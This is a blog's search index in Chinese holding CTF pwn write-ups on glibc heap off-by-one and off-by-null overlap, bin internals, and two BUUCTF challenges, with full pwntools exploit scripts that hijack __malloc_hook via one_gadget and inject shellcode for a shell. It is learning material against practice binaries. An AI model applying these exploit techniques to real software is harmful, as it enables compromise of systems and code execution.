<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>house of系列</title>
    <url>/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/</url>
    <content><![CDATA[<p> 该系列内容较多，将会在较长时间持续更新</p>
<h2 id="house-of-Roman"><a href="#house-of-Roman" class="headerlink" title="house of Roman"></a>house of Roman</h2><h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2>]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>offbyone&amp;null</title>
    <url>/2021/07/20/2021-07-26-offbyone-null/</url>
    <content><![CDATA[<h1 id="offbyone"><a href="#offbyone" class="headerlink" title="offbyone"></a>offbyone</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>正常来说，我们希望程序的堆溢出能够溢出到next chunk的fd或者bk字段，进而完成利用。但是这样的情况是很少的，因而需要一种更加常见的特殊的堆溢出形式——offbyone，溢出字节就如他的名字一样，只能溢出一个字节。实际生活中这种漏洞很常见，程序员很容易犯这种错误，一般是因为边界检查不严格等情况。</p>
<p>怎么利用呢？试想一下，如果能溢出一个字节，那么我们申请个0xn8大小的堆块，那么多出的一个字节是不是可以修改下一个堆块的size字段？修改了之后，会让程序认为这个堆块的大小就是你修改的大小，从而导致overlap</p>
<p>如果你只把一个堆块的size变大，然后释放再申请出来，扩大的size将会从下面的堆块中取来，并把里面的内容清空，也就是想要再使用里面的堆块，需要去修复对应的堆头（用来泄露libc基址时，需要这样分开来操作）</p>
<p>offbyone情形：</p>
<ul>
<li>strlen函数把next chunk的size字段也给计入进去，造成溢出一个字节</li>
</ul>
<p>利用方式：堆中有ABCD四个已经被分配的大小为0x70的chunk，现在都是使用状态。然后A是我们进行offbyone的chunk，我们目的是将B的size改掉。</p>
<img src="/2021/07/20/2021-07-26-offbyone-null/image-20210726164209854.png" style="zoom: 80%;"><span class="image-caption">image-20210726164209854</span>

<p>我们输入’A’*0x68 + ‘\xe1’,此时，堆块的布局如下：</p>
<img src="/2021/07/20/2021-07-26-offbyone-null/image-20210726164413949.png" style="zoom:80%;"><span class="image-caption">image-20210726164413949</span>

<p>可以看到b的size被改大了，正好覆盖到了c的末尾，我们构造了chunkoverlap。这时候我们将C free掉，他会进入fastbin。我们再将B free掉，B+C这一段区域会进入unsorted bin。我们再次申请一个大小为0xd0的堆块，也就是说B+C这段内存被我们控制了，此时我们就可以控制C的fd字段，就可以进行fastbin attack了。</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><img src="/2021/07/20/2021-07-26-offbyone-null/image-20210726113130649.png"><span class="image-caption">image-20210726113130649</span></p>
<p>常规checksec一下，然后进入ida看看程序代码</p>
<p><img src="/2021/07/20/2021-07-26-offbyone-null/image-20210726113232848.png"><span class="image-caption">image-20210726113232848</span></p>
<p>漏洞点存在与edit函数里面，在strlen函数里面，这个函数只有遇到’\x00’才会停止计数，如果我们申请0x78的堆块，并且填满0x78个字符，然后在这个堆块下面还存在一个堆块，那strlen就会把下一个堆块的size字段也给统计进去，从而可以多输入一个字符修改下一堆块的size字段。</p>
<p>那么该怎么构造呢？先申请四个0x68的堆块（至少四个）第一个用来修改下一个堆块的size字段，第四个用来防止与top chunk合并，中间两个用来制造overlap</p>
<p>把下一个堆块的size改为两倍大小——0xe1，接下来就是要让程序也认为被修改的堆块大小是0xe0，所以我们先后把第三块、第二块都释放掉，第三块进入fastbin，第二块由于size被改则进入到unsortedbin中，彻底让程序以为大小是为0xe0，最后只需要把0xe0的堆块申请出来，就可以修改其中本来是第三块的fd指针</p>
<p><img src="/2021/07/20/2021-07-26-offbyone-null/image-20210726164722535.png"><span class="image-caption">image-20210726164722535</span></p>
<p>成功制造了overlap，两个0x70的堆块合并了</p>
<p><img src="/2021/07/20/2021-07-26-offbyone-null/image-20210726164617715.png"><span class="image-caption">image-20210726164617715</span></p>
<p>很明显看到，fd指针已经被我们修改为我们想要分配chunk的地方</p>
<p><img src="/2021/07/20/2021-07-26-offbyone-null/image-20210726164850626.png"><span class="image-caption">image-20210726164850626</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./offbyone&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;size:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;content:&quot;</span>)<br>	p.send(content)	<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45206 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4525a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xef9f4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf0897 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>+p8(<span class="hljs-number">0xe1</span>))<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">4</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>libc_base=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3c3b78</span><br>mlh=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg=libc_base+<span class="hljs-number">0xef9f4</span><br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>log.success(<span class="hljs-built_in">hex</span>(ogg))<br>log.success(<span class="hljs-built_in">hex</span>(mlh))<br>free(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0xd0</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mlh-<span class="hljs-number">0x30</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">4</span>,payload)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(ogg))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h1 id="offbynull"><a href="#offbynull" class="headerlink" title="offbynull"></a>offbynull</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>其实本质也是一种offbyone，只是这个溢出的字节我们无法控制，只能是0。所以构造方法会与offbyone有些不同，但目的都是为了制造出overlap，毕竟uaf才是堆利用的核心！</p>
<p>offbynull情形：</p>
<ul>
<li>把你输入的堆块的地址加上输入的字符长度的地方置为0（一般来说没我下面的例题那么明显，会进行很多运算以及操作，但是本质还是一样的）</li>
</ul>
<p>怎么利用呢？因为溢出的是0，所以明显只能把修改preinuse位修改了，所以这边都是申请0xf8大小的堆块，这样的堆块刚好为0x101，溢出的0只会修改preinuse，不会影响大小</p>
<p>利用方式：</p>
<p>abcd四个大小为0x100的堆块，都是在使用状态，这时候我们的目标堆块是C堆块</p>
<img src="/2021/07/20/2021-07-26-offbyone-null/image-20210726170224084.png" style="zoom:80%;"><span class="image-caption">image-20210726170224084</span>

<p>我们在B中输入 ‘A’*0x90 + p64(0x200) + ‘\x00’，输入完后布局将会变化成这样</p>
<img src="/2021/07/20/2021-07-26-offbyone-null/image-20210726170351639.png" style="zoom:80%;"><span class="image-caption">image-20210726170351639</span>

<p>此时，C的previnuse位被改成了0，程序会将B看作已经被释放的堆块。然后由于系统是通过prevsize位来定位前一个堆块的位置，在这里，我们将其改成了0x200,也就是说定位到了A堆块。然后先将A free掉放入unsortedbin，这时候再free C，就会触发合并操作。ABC将会被看作一个大小为0x300的堆块放入unsortedbin中。然而实际上，B并没有被free，我们也就通过这样的方式构造了overlap</p>
<h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p><img src="/2021/07/20/2021-07-26-offbyone-null/image-20210726173924395.png"><span class="image-caption">image-20210726173924395</span></p>
<p>看程序的add函数里面，会把输入的长度多一个字节的地方置为0</p>
<p>这边有些奇怪，不懂为什么，如果只是用四个进行构造，将会报错，但是五个就行，第一个是用来泄露libc基址的，不用理会</p>
<p><img src="/2021/07/20/2021-07-26-offbyone-null/image-20210726174131814.png"><span class="image-caption">image-20210726174131814</span></p>
<p>这是修改完目标堆块，以及释放了指向的堆块（目标堆块减去0x300）</p>
<p><img src="/2021/07/20/2021-07-26-offbyone-null/image-20210726174439990.png"><span class="image-caption">image-20210726174439990</span></p>
<p>最后把目标堆块释放，触发合并，变成了0x400的堆块</p>
<p><img src="/2021/07/20/2021-07-26-offbyone-null/image-20210726174611943.png"><span class="image-caption">image-20210726174611943</span></p>
<p>之后就是构造大小为0x71的堆块，这边构造堆块要注意，在被构造的堆块后面还要构造一个堆头，因为需要preinuse位置为1来表示我们构造的堆块是被使用的，然后才能被释放进入到fastbin里面</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./offbynull&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;size:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;content:&quot;</span>)<br>	p.send(content)	<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45206 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4525a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xef9f4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf0897 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;dddd&#x27;</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;eeee&#x27;</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;gggg&#x27;</span>)<br><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>libc_base=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3c3b00</span><br>mlh=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg=libc_base+<span class="hljs-number">0xef9f4</span><br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>log.success(<span class="hljs-built_in">hex</span>(ogg))<br>log.success(<span class="hljs-built_in">hex</span>(mlh))<br><br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0x300</span>))<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">4</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x81</span>)  <span class="hljs-comment">#0x81让系统知道前面的堆块是被使用的</span><br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x1f0</span>,payload)<br>free(<span class="hljs-number">2</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mlh-<span class="hljs-number">0x30</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">1</span>,payload)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(ogg))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>bin链情况集合</title>
    <url>/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E9%9B%86%E5%90%88/</url>
    <content><![CDATA[<p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E9%9B%86%E5%90%88/image-20210720154252123-1627363406388.png"><span class="image-caption">image-20210720154252123</span></p>
<h1 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h1><h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><ul>
<li><p>大小范围：0x20 - 0x80</p>
</li>
<li><p>单链表结构，只有fd指针</p>
</li>
<li><p>FILO（最后一个进入fastbin链表的，会被放在头部）<br>总共有十个fastbin链表，每个链表中fastbin的size一样，0x10递增<br>大小属于fastbin的chunk被free掉时，不会改变nextchunk的previnuse位，也就是说不会被合并。</p>
</li>
</ul>
<p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E9%9B%86%E5%90%88/image-20210720154343954-1627363410633.png"><span class="image-caption">image-20210720154343954</span></p>
<h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><ul>
<li>被释放的堆块的fd指针不能指向自己（这也就是想要double free的时候，还需要一个中间chunk的原因）</li>
<li>将fastbin里面的chunk分配出去时，会检查size位会不会匹配chunk的大小，会才能分配</li>
</ul>
<h1 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h1><h3 id="基本结构-1"><a href="#基本结构-1" class="headerlink" title="基本结构"></a>基本结构</h3><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E9%9B%86%E5%90%88/image-20210726103140256-1627266738935.png" style="zoom:80%;">



<ul>
<li><p>只有一个双向链表，存在fd和bk指针</p>
</li>
<li><p>在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk（未被归类）都可以归属到unsorted bin中，临时存储用</p>
</li>
<li><p>unsortedbin采用的遍历顺序是FIFO</p>
</li>
<li><p>chunk被释放进入unsortedbin时，fdbk字段会留下一个main_arena的地址信息</p>
</li>
</ul>
<h3 id="unsorted-attack"><a href="#unsorted-attack" class="headerlink" title="unsorted attack"></a>unsorted attack</h3><p>libc版本在2.23及以下才能使用</p>
<p>利用前提是先有UAF，修改unsortedbin中的FD字段为0，BK字段为target addr - 0x10，然后malloc一个相同大小的chunk，即可完成攻击，在目标地址写入unsorted bin的地址，一般用来伪造堆头（制造出0x7f）、修改次数限制、上限信息、配合局部写</p>
<h1 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h1><h3 id="基本结构-2"><a href="#基本结构-2" class="headerlink" title="基本结构"></a>基本结构</h3><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E9%9B%86%E5%90%88/image-20210726103140256.png" style="zoom:80%;"><span class="image-caption">image-20210726103140256</span>

<ul>
<li><p>大小范围：0x90 - 0x400</p>
</li>
<li><p>由62个双向链表组成，每个链表中的chunk大小一样，大小以0x10递增，存在fd和bk指针</p>
</li>
<li><p>相邻的free chunk会触发合并操作，即合并成一个大的free chunk</p>
</li>
<li><p>采用的遍历顺序是FIFO</p>
</li>
</ul>
<h3 id="检查-1"><a href="#检查-1" class="headerlink" title="检查"></a>检查</h3><ul>
<li>unlink</li>
</ul>
<h1 id="largebin"><a href="#largebin" class="headerlink" title="largebin"></a>largebin</h1><h3 id="基本结构-3"><a href="#基本结构-3" class="headerlink" title="基本结构"></a>基本结构</h3><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E9%9B%86%E5%90%88/image-20210720153655147.png" style="zoom:80%;"><span class="image-caption">image-20210720153655147</span>

<p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E9%9B%86%E5%90%88/image-20210726103541056-1627363427270.png"><span class="image-caption">image-20210726103541056</span></p>
<ul>
<li><p>大小范围：0x410 以上</p>
</li>
<li><p>63个双向链表，不仅存在fd和bk指针，同时还有fd nextsize 和 bk nextsize</p>
</li>
<li><p>同一个双向链表中chunk大小可以不一样，但是在一定范围内，bins大小从小到大排列</p>
</li>
<li><p>相邻的free chunk会触发合并操作，即合并成一个大的free chunk</p>
</li>
<li><p>采用的遍历顺序是FIFO</p>
</li>
<li><p><strong>在这63个largebins中：第一组的32个largebin链</strong>依次以64字节步长为间隔，即第一个largebin链中chunksize为1024-1087字节，第二个large bin中chunk size为1088~1151字节。<strong>第二组的16个largebin链</strong>依次以512字节步长为间隔；<strong>第三组的8个largebin链</strong>以步长4096为间隔；<strong>第四组的4个largebin链</strong>以32768字节为间隔；<strong>第五组的2个largebin链</strong>以262144字节为间隔；<strong>最后一组</strong>的largebin链中的chunk大小无限制。</p>
</li>
</ul>
<h1 id="mallco过程"><a href="#mallco过程" class="headerlink" title="mallco过程"></a>mallco过程</h1><ul>
<li><p>计算真正堆块大小（加上头部长度、对齐）</p>
</li>
<li><p>是否在fastbin范围内？</p>
<ul>
<li>是，检查对应的bin链表中有没有chunk<ul>
<li>有，分配给用户，结束</li>
</ul>
</li>
</ul>
</li>
<li><p>如果不在fastbin范围内，或者没有chunk可用</p>
</li>
<li><p>是否在smallbin范围内？</p>
<ul>
<li>是，检查对应大小的bin链表中有没有chunk<ul>
<li>有，分配给用户，结束</li>
</ul>
</li>
</ul>
</li>
<li><p>如果不在smallbin范围内，或者smallbin里面也没有</p>
</li>
<li><p>unsortedbin中有没有chunk？</p>
<ul>
<li>有，从尾部取出第一个chunk，看看大小是否满足需求<ul>
<li>满足，切分后大小是否大于minsize？（64位下minisize为0x20）<ul>
<li>大于，切分块，返回给用户，剩下的块放进unsortedbin</li>
<li>小于或等于minsize，直接全部分配给用户，结束</li>
</ul>
</li>
<li>不满足，把这个块放入small/largebin对应的链表中，继续遍历下一个块</li>
</ul>
</li>
</ul>
</li>
<li><p>如果unsortedbin中所有的块也不能满足需求</p>
</li>
<li><p>大小是否在largebin范围？</p>
<ul>
<li>是，检查对应的bin链表中有没有符合的chunk<ul>
<li>有，找到满足需求最小的chunk，切分块返回，剩下的放进unsortedbin中</li>
</ul>
</li>
</ul>
</li>
<li><p>largebin也不行？再次遍历small/large寻找最合适的chunk</p>
</li>
<li><p>还是没有，那就从topchunk中切割</p>
</li>
<li><p>topchunk也不够？mmap系统调用</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>buu06</title>
    <url>/2021/06/05/2021-06-14-buu06/</url>
    <content><![CDATA[<h3 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h3><p>常规checksec一下，看看保护</p>
<p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210605121040.png"></p>
<p>只开启了NX</p>
<p>进入ida看看代码</p>
<p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210605121308.png"></p>
<p>第一个功能很神奇的让我们输入一个长度为0x10的数据，然后用system调用？我跑去nc了一下</p>
<p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210605121007.png"></p>
<p>好吧，成功获得flag了。</p>
<h3 id="picoctf-2018-shellcode"><a href="#picoctf-2018-shellcode" class="headerlink" title="picoctf_2018_shellcode"></a>picoctf_2018_shellcode</h3><p>checksec一下<img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614103954.png"></p>
<p>保护都没开启，拖入ida分析一下。无法F5反汇编，只能看汇编代码了。</p>
<p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614104047.png"></p>
<p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614104037.png"></p>
<p>有个vuln函数，里面有调用gets和puts两个函数，可以进行输入。再看其他代码，底下有个call eax，可以进行执行代码，看下eax的内容来自哪里</p>
<p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614104610.png"></p>
<p>这里传递给eax的地址与下面调用时一致，然后vuln函数里面gets输入的地址是ebp+8中存放的地址，其实就是eax里面的地址内容，所以整个程序总的说就是会执行我们输入进去的东西，加上nx未开，输入shellcode来getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28165</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br>p.sendlineafter(<span class="hljs-string">&quot;string!&quot;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

